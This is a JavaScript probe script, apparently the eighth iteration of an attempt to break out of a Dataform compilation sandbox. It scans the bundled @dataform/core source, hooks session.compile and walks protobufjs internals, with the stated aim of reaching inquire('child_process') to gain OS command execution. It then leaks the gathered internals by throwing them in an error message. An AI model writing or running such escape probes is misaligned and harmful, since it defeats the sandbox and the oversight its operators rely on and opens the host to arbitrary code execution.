// v8 — FINAL push: reach protobufjs.inquire and call inquire('child_process')

var out = {};
function safe(k, fn) {
  try { var v = fn(); out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 4000); }
  catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
}

var BUNDLE = restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString();

// ============ Find webpack entry module ID ============
safe('A1_webpack_entry', function() {
  // Bundle's outer function: `module.exports = function(e) { ... return r(...); }(...)`
  // Find `return r(` near the start
  var pat = /return\s+r\(/g;
  var matches = [];
  var m;
  while ((m = pat.exec(BUNDLE)) !== null && matches.length < 5) {
    matches.push({at: m.index, ctx: BUNDLE.substring(m.index, m.index + 100)});
  }
  return JSON.stringify(matches);
});

safe('A2_r_s_pattern', function() {
  // Sometimes webpack does `return r(r.s=N)`
  var idx = BUNDLE.indexOf('r.s=');
  if (idx < 0) idx = BUNDLE.indexOf('r.s =');
  if (idx < 0) return 'no r.s';
  return BUNDLE.substring(Math.max(0,idx-100), idx + 200);
});

// ============ Find how protobufjs (n) is exposed in bundle ============
safe('B1_protobufjs_namespace', function() {
  // Module 5 is protobufjs entry. It sets up n.Reader = r(...), n.Writer = r(...), n.inquire = r(27) etc.
  // Find n.inquire=r(27) and walk back to find the variable name
  var idx = BUNDLE.indexOf('n.inquire=r(27)');
  if (idx < 0) idx = BUNDLE.indexOf('inquire=r(27)');
  if (idx < 0) return 'not found';
  // Walk back to find module start
  var start = Math.max(0, idx - 2000);
  return BUNDLE.substring(start, idx + 500);
});

safe('B2_protobufjs_module_export', function() {
  // protobufjs root module — look for how it's exported
  // Pattern: `o = e.exports = r(5)` we already saw at offset 1521
  var idx = BUNDLE.indexOf('e.exports=r(5)');
  if (idx < 0) idx = BUNDLE.indexOf('o=e.exports=r(5)');
  if (idx < 0) return 'no e.exports=r(5)';
  return BUNDLE.substring(Math.max(0,idx-100), idx + 500);
});

// ============ Search for what reaches protobufjs and exposes it ============
safe('C1_dataform_proto_namespace', function() {
  // session.compile uses O.dataform.CompiledGraph — O is the dataform proto namespace
  // Find where O is defined as the protobuf root
  var pats = [
    /O\.dataform\s*=/,
    /\b\w+\.dataform\s*=\s*function/,
    /var\s+\w+\s*=\s*\w+\.Root/
  ];
  var matches = [];
  for (var p of pats) {
    var idx = BUNDLE.search(p);
    if (idx >= 0) {
      matches.push({pat: p.toString(), at: idx, ctx: BUNDLE.substring(Math.max(0,idx-100), idx + 400)});
    }
  }
  return JSON.stringify(matches);
});

// ============ Try accessing protobufjs through known proto messages ============
// Each protobuf Type has reference to Root via $type.root
safe('D1_proto_message_root_access', function() {
  var p = publish('access_root', { type: 'view' });
  // The proto MIGHT have $type
  var t = p.proto;

  // Try via constructor
  var ctor = t.constructor;

  // protobufjs minimal bundle creates "static" classes — try ctor.prototype.toJSON
  var protoT = Object.getPrototypeOf(t);
  var info = {
    t_keys: Object.getOwnPropertyNames(t).slice(0,30),
    t_proto_keys: Object.getOwnPropertyNames(protoT).slice(0,30),
    t_proto_ctor: protoT.constructor && protoT.constructor.name
  };
  return JSON.stringify(info);
});

safe('D2_walk_session_actions_for_root', function() {
  // session.actions contains the actions we've registered. Maybe their proto has links to root
  var actions = global._DF_SESSION.actions;
  if (!actions || actions.length === 0) return 'no actions';
  var a = actions[0];
  var info = {
    has_proto: !!a.proto,
    a_keys: Object.getOwnPropertyNames(a).slice(0,30),
    a_proto_keys: a.proto ? Object.getOwnPropertyNames(a.proto).slice(0,30) : null,
  };
  return JSON.stringify(info);
});

// ============ Best shot: hook session.compile and capture O via the call ============
safe('E1_hook_compile_grab_O', function() {
  var s = global._DF_SESSION;
  var origCompile = s.compile;
  globalThis.__compileHookFired = false;
  globalThis.__compiledGraph = null;
  s.compile = function() {
    globalThis.__compileHookFired = true;
    try {
      var result = origCompile.apply(this, arguments);
      globalThis.__compiledGraph = {
        type: typeof result,
        ctor_name: result && result.constructor && result.constructor.name,
        keys: result ? Object.getOwnPropertyNames(result).slice(0,30) : null,
        proto_keys: result ? Object.getOwnPropertyNames(Object.getPrototypeOf(result)).slice(0,30) : null,
        // The result is `O.dataform.CompiledGraph.create(...)`. result.constructor.$type would give us protobufjs reach
        ctor: result && result.constructor,
        ctor_keys: result && result.constructor ? Object.getOwnPropertyNames(result.constructor) : null,
        ctor_static_create: result && result.constructor && typeof result.constructor.create,
        // Try to reach Root via constructor — Type.fromJSON has $root
      };
      // ATTEMPT INQUIRE NOW that we have result
      if (result && result.constructor) {
        var C = result.constructor;
        // protobufjs Type instances have access to root via $type / nested namespaces
        // The constructor is typically created by Root.lookup. Walk up.
        var attempts = {};
        for (var path of ['$type', '$type.root', '$root', 'root', 'parent']) {
          try {
            var v = C;
            for (var part of path.split('.')) v = v[part];
            attempts[path] = v ? ('typeof=' + typeof v + ' keys=' + Object.getOwnPropertyNames(v).slice(0,20).join(',')) : 'null';
          } catch(e) { attempts[path] = 'err:' + e.message; }
        }
        globalThis.__compiledGraph.attempts = attempts;
      }
      return result;
    } catch(e) {
      globalThis.__compiledGraph = {err: e.message};
      throw e;
    }
  };
  return 'hooked compile';
});

// ============ Force compile NOW so we capture O ============
safe('E2_force_compile', function() {
  try {
    var result = global._DF_SESSION.compile();
    return 'compile result type=' + typeof result + ' captured? ' + (globalThis.__compiledGraph ? 'yes' : 'no');
  } catch(e) { return 'err:' + e.message; }
});

safe('E3_read_captured', function() {
  return JSON.stringify(globalThis.__compiledGraph);
});

// ============ Plan C: protobufjs Reader/Writer might be at well-known names ============
safe('F1_find_Reader_Writer', function() {
  // Search bundle for "exports.Reader" or "Reader=r("
  var pats = ['exports.Reader', 'Reader=r(', 'this.Reader=', 't.Reader='];
  var results = {};
  for (var p of pats) {
    var idx = BUNDLE.indexOf(p);
    if (idx >= 0) {
      results[p] = BUNDLE.substring(Math.max(0,idx-50), idx + 200);
    }
  }
  return JSON.stringify(results);
});

// ============ ULTIMATE: directly look at session.compile.compileToBase64.toString ============
// It uses `a.encode64` — a is the helper module that imports protobufjs
safe('G1_compileToBase64_helper', function() {
  return String(global._DF_SESSION.compileToBase64).substring(0, 1000);
});

// `i.decode64` in core.main — decoding base64 protobuf
// `a.encode64` in compileToBase64
// 'a' module — find it
safe('G2_a_module_search', function() {
  // Find where `a.encode64` is — that's the protobufjs base64 codec
  var idx = BUNDLE.indexOf('a.encode64');
  if (idx < 0) return 'not found';
  // Walk back to find a's definition
  var start = Math.max(0, idx - 3000);
  return BUNDLE.substring(start, idx + 200);
});

module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
throw new Error('PROBE_v8:' + JSON.stringify(out));
